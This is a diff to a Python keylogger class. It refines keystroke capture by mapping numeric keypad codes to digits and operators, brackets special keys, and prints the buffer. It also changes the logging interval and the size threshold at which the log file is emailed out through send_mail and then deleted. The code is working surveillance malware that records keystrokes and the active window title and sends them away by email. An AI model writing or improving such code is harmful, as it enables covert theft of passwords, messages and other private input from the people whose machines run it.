@@ -25,7 +25,37 @@ class Keylogger:
             self.window = self.get_window_name()
             self.string += "\n\n[ " + self.window + " ("+ datetime.now().strftime("%m/%d/%Y, %Hh%Mm%Ss") + ")]\n"
         try:
-            self.string += key.char
+            if hasattr(key, 'vk') and 96 <= key.vk <= 110:
+                if key.vk == 96:
+                    self.string+= "0"
+                if key.vk == 97:
+                    self.string+= "1"
+                if key.vk == 98:
+                    self.string+= "2"
+                if key.vk == 99:
+                    self.string+= "3"
+                if key.vk == 100:
+                    self.string+= "4"
+                if key.vk == 101:
+                    self.string+= "5"
+                if key.vk == 102:
+                    self.string+= "6"
+                if key.vk == 103:
+                    self.string+= "7"
+                if key.vk == 104:
+                    self.string+= "8"
+                if key.vk == 105:
+                    self.string+= "9"
+                if key.vk == 106:
+                    self.string+= "*"
+                if key.vk == 107:
+                    self.string+= "+"
+                if key.vk == 109:
+                    self.string+= "-"
+                if key.vk == 110:
+                    self.string+= "."
+            else:
+                self.string += key.char
         except AttributeError:
             if str(key) == "Key.space":
                 self.string += " "
@@ -34,21 +64,22 @@ class Keylogger:
             elif str(key) == "Key.shift":
                 pass
             else:
-                self.string += ' ' + str(key).strip('Key.') + ' '
+                self.string += ' [' + str(key).strip('Key.') + '] '
         except:
             self.string += "??"
+        print(self.string)
 
     def log(self):
         with open("log.txt","a") as f:
             f.write(self.string)
             self.string = ""
             self.report()
-            thread = threading.Timer(15,self.log)
+            thread = threading.Timer(60,self.log)
             thread.start()
     
     def report(self):
         try:
-            if os.stat('log.txt').st_size > 2000:
+            if os.stat('log.txt').st_size > 5000:
                 self.send_mail('log.txt')
                 os.remove('log.txt')
         except FileNotFoundError:
